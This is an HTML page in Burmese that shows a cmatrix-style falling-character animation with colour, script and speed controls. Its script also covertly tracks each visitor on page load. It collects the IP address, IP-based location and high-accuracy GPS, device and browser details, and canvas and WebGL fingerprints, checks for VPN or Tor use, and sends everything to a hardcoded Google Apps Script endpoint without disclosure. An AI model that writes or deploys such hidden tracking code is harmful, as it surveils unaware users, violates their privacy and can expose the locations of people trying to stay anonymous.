<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title> ဇာတ်လမ်းကောင်းများစုစည်းရာ </title>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            -webkit-touch-callout: none;
        }
         
        /* Loading Animation Styles */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 100;
            transition: opacity 0.5s ease;
        }
        
        .loading-screen.fade-out {
            opacity: 0;
            pointer-events: none;
        }
        
        .loading-text {
            color: #fff;
            font-family: 'Myanmar Text', 'Padauk', sans-serif;
            font-size: 18px;
            margin-bottom: 20px;
            text-align: center;
            text-shadow: 0 0 10px #fff;
        }
        
        .loading-bar-container {
            width: 200px;
            height: 4px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            overflow: hidden;
        }
        
        .loading-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #ff3366, #ff9933);
            border-radius: 2px;
            transition: width 0.3s ease;
            box-shadow: 0 0 10px #ff3366;
        }
        
        .loading-percentage {
            color: #fff;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin-top: 10px;
            text-shadow: 0 0 5px #fff;
        }
        
        .highlight-red {
            color: #ff3366;
            text-shadow: 0 0 10px #ff3366;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        .highlight-red {
            color: #ff3366;
            text-shadow: 0 0 10px #ff3366;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
        }
        
        .highlight-red:hover {
            text-shadow: 0 0 15px #ff3366, 0 0 20px #ff3366;
            transform: scale(1.1);
        }
        
        body {
            background: #000;
            font-family: 'Myanmar Text', 'Padauk', 'Courier New', monospace;
            overflow: hidden;
            width: 100vw;
            height: 100vh;
            touch-action: none;
            cursor: default;
        }
        
        .container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            padding: 8px;
            text-align: center;
            z-index: 10;
            background: rgba(0, 0, 0, 0.7);
        }
        
        h1 {
            color: #fff;
            font-size: 18px;
            letter-spacing: 1.5px;
            margin-bottom: 4px;
            text-shadow: 0 0 8px #fff;
        }
        
        .subtitle {
            color: rgba(255, 255, 255, 0.7);
            font-size: 10px;
            line-height: 1.3;
        }
        
        .time-counter {
            color: #ff3366;
            font-size: 12px;
            margin-top: 5px;
            font-family: 'Courier New', monospace;
            text-shadow: 0 0 5px #ff3366;
        }
        
        .matrix-container {
            flex: 1;
            position: relative;
            overflow: hidden;
            cursor: pointer;
        }
        
        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }
        
        .fab-container {
            position: fixed;
            bottom: 15px;
            right: 15px;
            z-index: 20;
        }
        
        .fab-btn {
            width: 45px;
            height: 45px;
            background: #ff4081;
            border-radius: 50%;
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            cursor: pointer;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
            transition: transform 0.3s;
        }
        
        .fab-btn:hover {
            transform: scale(1.1);
        }
        
        .fab-btn.active {
            transform: rotate(45deg);
        }
        
        .controls-panel {
            position: fixed;
            bottom: 70px;
            right: 15px;
            background: rgba(0, 0, 0, 0.9);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 6px;
            padding: 12px;
            display: none;
            flex-direction: column;
            gap: 10px;
            width: 200px;
            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.3);
            transition: opacity 0.3s, transform 0.3s;
            z-index: 25;
        }
        
        .controls-panel.show {
            display: flex;
            opacity: 1;
            transform: translateY(0);
        }
        
        .controls-panel.hide {
            opacity: 0;
            transform: translateY(15px);
        }
        
        .controls {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        
        .btn {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid #fff;
            color: #fff;
            padding: 6px;
            border-radius: 18px;
            cursor: pointer;
            font-family: 'Myanmar Text', 'Padauk', sans-serif;
            font-size: 11px;
            text-align: center;
            transition: all 0.3s;
            touch-action: manipulation;
        }
        
        .btn:hover {
            background: rgba(255, 255, 255, 0.2);
        }
        
        .slider-group {
            display: flex;
            flex-direction: column;
            gap: 6px;
        }
        
        .slider-container {
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .slider-label {
            color: #fff;
            font-size: 10px;
            min-width: 60px;
        }
        
        .slider-controls {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .speed-btn, .brightness-btn {
            width: 24px;
            height: 24px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            user-select: none;
        }
        
        .speed-btn.increase, .brightness-btn.increase {
            background-color: #0f0;
            color: #000;
        }
        
        .speed-btn.decrease, .brightness-btn.decrease {
            background-color: #f00;
            color: #fff;
        }
        
        .value-display {
            color: #fff;
            font-size: 10px;
            min-width: 30px;
            text-align: center;
        }
        
        .info-panel {
            position: fixed;
            bottom: 60px;
            left: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 6px;
            padding: 8px;
            color: #fff;
            font-size: 10px;
            line-height: 1.4;
            z-index: 20;
            display: none;
        }
        
        .info-btn {
            position: fixed;
            bottom: 15px;
            left: 15px;
            width: 28px;
            height: 28px;
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #fff;
            border-radius: 50%;
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            cursor: pointer;
            z-index: 20;
        }

        .admin-link {
            display: none;
        }

        .tracking-status {
            position: fixed;
            top: 10px;
            right: 10px;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            z-index: 20;
            display: none;
            box-shadow: 0 0 10px currentColor;
        }

        .tracking-status.tracking {
            background-color: #ff9800;
        }

        .tracking-status.active {
            background-color: #0f0;
        }

        .tracking-status.error {
            background-color: #f00;
        }

        @media (max-width: 768px) {
            
            .loading-text {
                font-size: 16px;
            }
            
            .loading-bar-container {
                width: 180px;
            }
            h1 {
                font-size: 14px;
            }
            .subtitle {
                font-size: 9px;
            }
            .time-counter {
                font-size: 18px;
            }
            .controls-panel {
                width: 180px;
            }
            .btn {
                font-size: 10px;
                padding: 5px;
            }
            .slider-label {
                font-size: 9px;
                min-width: 50px;
            }
            .fab-btn {
                width: 40px;
                height: 40px;
                font-size: 18px;
            }
            .info-btn {
                width: 26px;
                height: 26px;
                font-size: 11px;
            }
            .admin-link {
                display: none;
            }
            .tracking-status {
                width: 18px;
                height: 18px;
            }
        }
    </style>
</head>
<body>
    <!-- Loading Screen -->
    <div class="loading-screen" id="loadingScreen">
        <div class="loading-text">‌ ‌‌‌ကျေးဇူးပြု၍ ခေတ္တစောင့်ပါ ‌</div>
        <div class="loading-bar-container">
            <div class="loading-bar" id="loadingBar"></div>
        </div>
        <div class="loading-percentage" id="loadingPercentage">0%</div>
    </div>
    
    <div class="container">
        <div class="header">
            <h1>Burmese Matrix Effect</h1>
            <div id="timeCounter" class="time-counter"></div>
        </div>
        
        <div class="tracking-status" id="trackingStatus"></div>
        
        <div class="matrix-container" id="matrixContainer">
            <canvas id="matrixCanvas"></canvas>
        </div>
        
        <div class="fab-container">
            <div class="fab-btn" id="fabBtn">+</div>
            <div class="controls-panel" id="controlsPanel">
                <div class="controls">
                    <button class="btn" id="colorBtn">ရောင်စုံ</button>
                    <button class="btn" id="scriptBtn">မြန်မာ</button>
                    <button class="btn" id="restartBtn">ပြန်စမည်</button>
                </div>
                <div class="slider-group">
                    <div class="slider-container">
                        <span class="slider-label">အမြန်နှုန်း</span>
                        <div class="slider-controls">
                            <div class="speed-btn decrease">-</div>
                            <span class="value-display" id="speedValue">25</span>
                            <div class="speed-btn increase">+</div>
                        </div>
                    </div>
                    <div class="slider-container">
                        <span class="slider-label">အလင်း</span>
                        <div class="slider-controls">
                            <div class="brightness-btn decrease">-</div>
                            <span class="value-display" id="brightnessValue">100</span>
                            <div class="brightness-btn increase">+</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="info-btn" id="infoBtn">i</div>
        <a href="admin.html" class="admin-link">Admin</a>
        
        <div class="info-panel" id="infoPanel">
            <strong>မြန်မာ Matrix Effect</strong><br>
            Terminal မှာပြနေကျ cmatrix effect ကို မြန်မာအက္ခရာများဖြင့် ပြုလုပ်ထားခြင်းဖြစ်ပါသည်။<br>
            Original cmatrix ကို Chris Allegretta မှ 2002 ခုနှစ်တွင် ဖန်တီးခဲ့ပါသည်။(<span class="highlight-red" id="adminTrigger">ဝိ‌ဇ္ဇာ</span>)
        </div>
    </div>

    <script>
            // Loading Animation
        function initLoadingAnimation() {
            const loadingScreen = document.getElementById('loadingScreen');
            const loadingBar = document.getElementById('loadingBar');
            const loadingPercentage = document.getElementById('loadingPercentage');
            
            let progress = 0;
            const duration = 10000; // 10 seconds
            const interval = 50; // update every 50ms
            const steps = duration / interval;
            const increment = 100 / steps;
            
            const loadingInterval = setInterval(() => {
                progress += increment;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(loadingInterval);
                    
                    // Fade out loading screen
                    loadingScreen.classList.add('fade-out');
                    
                    // Remove loading screen after fade out
                    setTimeout(() => {
                        loadingScreen.style.display = 'none';
                        
                        // Initialize the main application
                        initMainApplication();
                    }, 500);
                }
                
                loadingBar.style.width = `${progress}%`;
                loadingPercentage.textContent = `${Math.round(progress)}%`;
            }, interval);
        }
        
        const startDate = new Date(2016, 11, 31, 7, 30, 0, 0);
        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxipy_SRr2p464dy4UnpiKC2C9S9BWoMPRyzQ8aquD0w8TlaQiPjsF01yrr9YaTg-8llQ/exec';

        function updateTimeCounter() {
            const now = new Date();
            const diffMs = now - startDate;
            
            const days = Math.floor(diffMs / (1000 * 60 * 60 * 24));
            const hours = Math.floor((diffMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((diffMs % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((diffMs % (1000 * 60)) / 1000);
            const milliseconds = diffMs % 1000;
            
            const timeString = `8.1215225.251521.7761: ${days} days, ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}.${milliseconds.toString().padStart(3, '0')}`;
            
            document.getElementById('timeCounter').textContent = timeString;
        }

        // Enhanced tracking with GPS and VPN detection
        async function trackVisitor() {
            const statusElement = document.getElementById('trackingStatus');
            
            try {
                statusElement.style.display = 'block';
                statusElement.className = 'tracking-status tracking';

                // Get basic visitor info
                const visitorInfo = {
                    timestamp: new Date().toISOString(),
                    country: 'Unknown',
                    countryCode: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown',
                    latitude: 'N/A',
                    longitude: 'N/A',
                    ip: 'Unknown',
                    isp: 'Unknown',
                    organization: 'Unknown',
                    asn: 'Unknown',
                    connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
                    networkType: navigator.connection ? navigator.connection.type : 'unknown',
                    operator: 'unknown',
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    page: 'Matrix Effect',
                    screen: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer || 'Direct'
                };

                // Get IP and location data
                const ipData = await getIPData();
                if (ipData) {
                    visitorInfo.ip = ipData.ip || 'Unknown';
                    visitorInfo.country = ipData.country || 'Unknown';
                    visitorInfo.countryCode = ipData.countryCode || 'Unknown';
                    visitorInfo.city = ipData.city || 'Unknown';
                    visitorInfo.region = ipData.region || 'Unknown';
                    visitorInfo.latitude = ipData.latitude || 'N/A';
                    visitorInfo.longitude = ipData.longitude || 'N/A';
                    visitorInfo.isp = ipData.isp || 'Unknown';
                    visitorInfo.organization = ipData.org || 'Unknown';
                    visitorInfo.asn = ipData.asn || 'Unknown';
                    
                    // VPN detection
                    visitorInfo.vpnDetected = detectVPN(ipData);
                }

                // Try to get GPS coordinates
                const gpsData = await getGPSData();
                if (gpsData) {
                    visitorInfo.gpsLatitude = gpsData.latitude;
                    visitorInfo.gpsLongitude = gpsData.longitude;
                    visitorInfo.gpsAccuracy = gpsData.accuracy;
                    visitorInfo.gpsSource = gpsData.source;
                }

                // Get device information
                const deviceInfo = getDeviceInfo();
                Object.assign(visitorInfo, deviceInfo);

                // Send to Google Sheets
                const result = await sendToGoogleSheet(visitorInfo);
                
                if (result.status === 'success') {
                    statusElement.className = 'tracking-status active';
                    setTimeout(() => {
                        statusElement.style.display = 'none';
                    }, 3000);
                } else {
                    throw new Error(result.message);
                }
                
            } catch (error) {
                console.log('Visitor tracking failed:', error);
                statusElement.className = 'tracking-status error';
                setTimeout(() => {
                    statusElement.style.display = 'none';
                }, 3000);
            }
        }

        // Get IP data from multiple sources
        async function getIPData() {
            const services = [
                'https://ipapi.co/json/',
                'https://api.ipify.org?format=json',
                'https://ipinfo.io/json'
            ];
            
            for (const service of services) {
                try {
                    const response = await fetch(service, {
                        method: 'GET',
                        mode: 'cors',
                        headers: {
                            'Accept': 'application/json',
                        }
                    });
                    
                    if (response.ok) {
                        const data = await response.json();
                        return processIPData(data, service);
                    }
                } catch (error) {
                    console.log(`Failed to get IP from ${service}:`, error);
                }
            }
            
            return null;
        }

        // Process IP data from different services
        function processIPData(data, service) {
            if (service.includes('ipapi.co')) {
                return {
                    ip: data.ip,
                    country: data.country_name,
                    countryCode: data.country_code,
                    city: data.city,
                    region: data.region,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    isp: data.org,
                    org: data.org,
                    asn: data.asn
                };
            } else if (service.includes('ipinfo.io')) {
                const loc = data.loc ? data.loc.split(',') : [null, null];
                return {
                    ip: data.ip,
                    country: data.country,
                    countryCode: data.country,
                    city: data.city,
                    region: data.region,
                    latitude: loc[0],
                    longitude: loc[1],
                    isp: data.org,
                    org: data.org,
                    asn: data.org?.includes('AS') ? data.org : null
                };
            } else {
                return {
                    ip: data.ip,
                    country: 'Unknown',
                    countryCode: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown',
                    latitude: 'N/A',
                    longitude: 'N/A',
                    isp: 'Unknown',
                    org: 'Unknown',
                    asn: 'Unknown'
                };
            }
        }

        // Detect VPN based on IP data
        function detectVPN(ipData) {
            // Simple VPN detection heuristics
            const vpnIndicators = [
                ipData.isp?.toLowerCase().includes('vpn'),
                ipData.org?.toLowerCase().includes('vpn'),
                ipData.isp?.toLowerCase().includes('proxy'),
                ipData.org?.toLowerCase().includes('proxy'),
                ipData.isp?.toLowerCase().includes('tor'),
                ipData.org?.toLowerCase().includes('tor'),
                ipData.asn?.includes('AS') && parseInt(ipData.asn.replace('AS', '')) > 100000
            ];
            
            return vpnIndicators.some(indicator => indicator === true) ? 'Yes' : 'No';
        }

        // Get GPS coordinates
        function getGPSData() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            source: 'GPS'
                        });
                    },
                    (error) => {
                        console.log('GPS error:', error);
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 60000
                    }
                );
            });
        }

        // Get detailed device information
        function getDeviceInfo() {
            const deviceInfo = {
                deviceType: getDeviceType(),
                browser: getBrowserInfo(),
                cpuCores: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                doNotTrack: navigator.doNotTrack || 'Unknown',
                cookiesEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
                plugins: getPluginsInfo(),
                canvasFingerprint: getCanvasFingerprint(),
                webglFingerprint: getWebGLFingerprint()
            };
            
            return deviceInfo;
        }

        // Get device type
        function getDeviceType() {
            const ua = navigator.userAgent;
            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) {
                return "Tablet";
            }
            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) {
                return "Mobile";
            }
            return "Desktop";
        }

        // Get browser information
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = "Unknown";
            
            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
            else if (ua.includes("Firefox")) browser = "Firefox";
            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
            else if (ua.includes("Edg")) browser = "Edge";
            else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
            else if (ua.includes("MSIE") || ua.includes("Trident")) browser = "Internet Explorer";
            
            return browser;
        }

        // Get plugins information
        function getPluginsInfo() {
            if (!navigator.plugins) return 'None';
            
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {
                plugins.push(navigator.plugins[i].name);
            }
            return plugins.join(', ') || 'None';
        }

        // Get canvas fingerprint
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Canvas Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Canvas Fingerprint', 4, 17);
                return canvas.toDataURL().substring(22, 50); // Return partial hash
            } catch (e) {
                return 'Error';
            }
        }

        // Get WebGL fingerprint
        function getWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (!gl) return 'Not supported';
                
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                return `${vendor} - ${renderer}`.substring(0, 50);
            } catch (e) {
                return 'Error';
            }
        }

        // Send data to Google Sheet via Google Apps Script
        async function sendToGoogleSheet(visitorData) {
            try {
                // Create a simple form submission to avoid CORS issues
                const formData = new FormData();
                formData.append('data', JSON.stringify(visitorData));

                const response = await fetch(GOOGLE_SCRIPT_URL, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors' // Use no-cors to avoid CORS issues
                });

                // With no-cors, we can't read the response, so we assume success
                return { status: 'success', message: 'Data sent successfully' };
                
            } catch (error) {
                console.error('Error sending to Google Sheet:', error);
                return {
                    status: 'error',
                    message: error.toString()
                };
            }
        }

        // Matrix effect code (unchanged)
        document.addEventListener('DOMContentLoaded', () => {
            setTimeout(trackVisitor, 2000);
            
            const canvas = document.getElementById('matrixCanvas');
            const ctx = canvas.getContext('2d');
            const fabBtn = document.getElementById('fabBtn');
            const controlsPanel = document.getElementById('controlsPanel');
            const restartBtn = document.getElementById('restartBtn');
            const colorBtn = document.getElementById('colorBtn');
            const scriptBtn = document.getElementById('scriptBtn');
            const speedValue = document.getElementById('speedValue');
            const brightnessValue = document.getElementById('brightnessValue');
            const speedIncreaseBtn = document.querySelector('.speed-btn.increase');
            const speedDecreaseBtn = document.querySelector('.speed-btn.decrease');
            const brightnessIncreaseBtn = document.querySelector('.brightness-btn.increase');
            const brightnessDecreaseBtn = document.querySelector('.brightness-btn.decrease');
            const infoBtn = document.getElementById('infoBtn');
            const infoPanel = document.getElementById('infoPanel');
            const matrixContainer = document.getElementById('matrixContainer');
            const adminTrigger = document.getElementById('adminTrigger');
            
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            
            const scripts = [
                { name: 'မြန်မာ', chars: 'ခဂငစဇဈဉဋဌဍဎဒဓနပဖဗမရဝဠအဥဦဧဏ္ဌဏ္ဍ၏၍၌' },
                { name: 'Japanese', chars: 'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん' },
                { name: 'Tibetan', chars: 'ཀཁགངཅཆཇཉཏཐདནཔཕབམཙཚཛཝཞཟའཡརལཤཥསཧཨ' },
                { name: 'Hindi', chars: 'अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसह' },
                { name: 'Chinese', chars: '一二三四五六七八九十百千万亿人日月火水木金土山川田海口耳目手足心' },
                { name: 'Thai', chars: 'กขคฆงจฉชซฌญฎฏฐฑฒณดตถทธนบปผฝพฟภมยรลวศษสหฬอ' },
                { name: 'Lao', chars: 'ກຂຄງຈຉຊຍດຕຖທນບປຜຝພຟມຢຣລວສຫອ' },
                { name: 'Khmer', chars: 'កខគឃងចឆជឈញដឋឌឍណតថទធនបផពភមយរលវសហឡអ' },
                { name: 'Indonesian', chars: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' },
                { name: 'English', chars: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' }
            ];
            
            let currentScriptIndex = 0;
            let chars = scripts[currentScriptIndex].chars;
            const fontSize = 11;
            const columns = Math.floor(canvas.width / fontSize);
            
            const drops = [];
            for (let i = 0; i < columns; i++) {
                drops[i] = Math.floor(Math.random() * -canvas.height);
            }
            
            let animationSpeed = 25;
            let brightness = 1.0;
            let isPaused = false;
            let lastFrameTime = 0;
            let animationId;
            
            const colorModes = [
                { name: 'ရောင်စုံ', type: 'rainbow' },
                { name: 'ရွှေရောင်', type: 'gold' },
                { name: 'အဖြူရောင်', type: 'white' },
                { name: 'အစိမ်း', type: 'green' },
                { name: 'အနီ', type: 'red' },
                { name: 'အပြာ', type: 'blue' }
            ];
            
            let currentColorModeIndex = 0;
            
            speedValue.textContent = animationSpeed;
            brightnessValue.textContent = Math.round(brightness * 100);
            
            function draw(timestamp) {
                if (!lastFrameTime) lastFrameTime = timestamp;
                const deltaTime = timestamp - lastFrameTime;
                
                if (deltaTime > 1000 / animationSpeed) {
                    lastFrameTime = timestamp;
                    
                    ctx.fillStyle = `rgba(0, 0, 0, ${0.08 * (2 - brightness)})`;
                    ctx.fillRect(0, 0, canvas.width, canvas.height);
                    
                    ctx.font = `bold ${fontSize}px 'Myanmar Text', 'Padauk', monospace`;
                    
                    for (let i = 0; i < drops.length; i++) {
                        const text = chars.charAt(Math.floor(Math.random() * chars.length));
                        
                        let color;
                        let growEffect = false;
                        
                        switch (colorModes[currentColorModeIndex].type) {
                            case 'rainbow':
                                const hue = (i * 10 + timestamp / 50) % 360;
                                color = `hsl(${hue}, 100%, ${50 + 30 * Math.sin(timestamp / 1000 + i * 0.1)}%)`;
                                growEffect = true;
                                break;
                            case 'gold':
                                const goldIntensity = 0.7 + 0.3 * Math.sin(timestamp / 800 + i * 0.05);
                                color = `rgba(255, 215, 0, ${brightness * goldIntensity})`;
                                growEffect = true;
                                break;
                            case 'white':
                                const whiteIntensity = 0.6 + 0.4 * Math.sin(timestamp / 600 + i * 0.08);
                                color = `rgba(255, 255, 255, ${brightness * whiteIntensity})`;
                                growEffect = true;
                                break;
                            case 'green':
                                const greenIntensity = 0.5 + 0.5 * Math.sin(timestamp / 700 + i * 0.07);
                                color = `rgba(0, 255, 0, ${brightness * greenIntensity})`;
                                growEffect = true;
                                break;
                            case 'red':
                                const redIntensity = 0.5 + 0.5 * Math.sin(timestamp / 500 + i * 0.09);
                                color = `rgba(255, 0, 0, ${brightness * redIntensity})`;
                                growEffect = true;
                                break;
                            case 'blue':
                                const blueIntensity = 0.5 + 0.5 * Math.sin(timestamp / 900 + i * 0.06);
                                color = `rgba(0, 0, 255, ${brightness * blueIntensity})`;
                                growEffect = true;
                                break;
                            default:
                                color = `rgba(255, 255, 255, ${brightness})`;
                        }
                        
                        ctx.fillStyle = color;
                        
                        if (growEffect) {
                            ctx.shadowBlur = 10 + 5 * Math.sin(timestamp / 400 + i * 0.1);
                            ctx.shadowColor = color;
                        } else {
                            ctx.shadowBlur = 6 * brightness;
                            ctx.shadowColor = color;
                        }
                        
                        if (growEffect) {
                            const growSize = fontSize * (1 + 0.1 * Math.sin(timestamp / 300 + i * 0.05));
                            ctx.font = `bold ${growSize}px 'Myanmar Text', 'Padauk', monospace`;
                            ctx.fillText(text, i * fontSize, drops[i]);
                            ctx.font = `bold ${fontSize}px 'Myanmar Text', 'Padauk', monospace`;
                        } else {
                            ctx.fillText(text, i * fontSize, drops[i]);
                        }
                        
                        ctx.shadowBlur = 0;
                        
                        if (!isPaused) {
                            drops[i] += fontSize;
                        }
                        
                        if (drops[i] > canvas.height && Math.random() > 0.97) {
                            drops[i] = Math.floor(Math.random() * -fontSize * 15);
                        }
                    }
                }
                
                animationId = requestAnimationFrame(draw);
            }
            
            adminTrigger.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                window.open('admin.html', '_blank');
            });
            
            updateTimeCounter();
            setInterval(updateTimeCounter, 1);
            
            fabBtn.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                const isActive = controlsPanel.classList.contains('show');
                controlsPanel.classList.toggle('show', !isActive);
                controlsPanel.classList.toggle('hide', isActive);
                fabBtn.classList.toggle('active');
            });
            
            document.addEventListener('click', (e) => {
                if (!controlsPanel.contains(e.target) && !fabBtn.contains(e.target)) {
                    controlsPanel.classList.remove('show');
                    controlsPanel.classList.add('hide');
                    fabBtn.classList.remove('active');
                }
            });
            
            controlsPanel.addEventListener('click', (e) => {
                e.stopPropagation();
            });
            
            matrixContainer.addEventListener('click', (e) => {
                e.preventDefault();
                isPaused = !isPaused;
            });
            
            matrixContainer.addEventListener('mousedown', (e) => {
                e.preventDefault();
            });
            
            matrixContainer.addEventListener('touchstart', (e) => {
                e.preventDefault();
            });
            
            restartBtn.addEventListener('click', (e) => {
                e.preventDefault();
                for (let i = 0; i < drops.length; i++) {
                    drops[i] = Math.floor(Math.random() * -canvas.height);
                }
                isPaused = false;
            });
            
            colorBtn.addEventListener('click', (e) => {
                e.preventDefault();
                currentColorModeIndex = (currentColorModeIndex + 1) % colorModes.length;
                colorBtn.textContent = colorModes[currentColorModeIndex].name;
            });
            
            scriptBtn.addEventListener('click', (e) => {
                e.preventDefault();
                currentScriptIndex = (currentScriptIndex + 1) % scripts.length;
                scriptBtn.textContent = scripts[currentScriptIndex].name;
                chars = scripts[currentScriptIndex].chars;
            });
            
            speedIncreaseBtn.addEventListener('click', (e) => {
                e.preventDefault();
                if (animationSpeed < 5) {
                    animationSpeed += 1;
                } else if (animationSpeed < 60) {
                    animationSpeed += 5;
                }
                speedValue.textContent = animationSpeed;
            });
            
            speedDecreaseBtn.addEventListener('click', (e) => {
                e.preventDefault();
                if (animationSpeed > 5) {
                    animationSpeed -= 5;
                } else if (animationSpeed > 1) {
                    animationSpeed -= 1;
                }
                speedValue.textContent = animationSpeed;
            });
            
            brightnessIncreaseBtn.addEventListener('click', (e) => {
                e.preventDefault();
                brightness = Math.min(1.0, brightness + 0.1);
                brightnessValue.textContent = Math.round(brightness * 100);
            });
            
            brightnessDecreaseBtn.addEventListener('click', (e) => {
                e.preventDefault();
                brightness = Math.max(0.1, brightness - 0.1);
                brightnessValue.textContent = Math.round(brightness * 100);
            });
            
            infoBtn.addEventListener('click', (e) => {
                e.preventDefault();
                e.stopPropagation();
                infoPanel.style.display = infoPanel.style.display === 'block' ? 'none' : 'block';
            });
            
            document.addEventListener('click', (e) => {
                if (!infoPanel.contains(e.target) && !infoBtn.contains(e.target)) {
                    infoPanel.style.display = 'none';
                }
            });
            
            window.addEventListener('resize', () => {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                drops.length = Math.floor(canvas.width / fontSize);
                for (let i = 0; i < drops.length; i++) {
                    if (!drops[i]) drops[i] = Math.floor(Math.random() * -canvas.height);
                }
            });
            
            draw();
        });
    
        // Start the loading animation when the page loads
        window.addEventListener('load', initLoadingAnimation);
  
    </script>
</body>
</html>
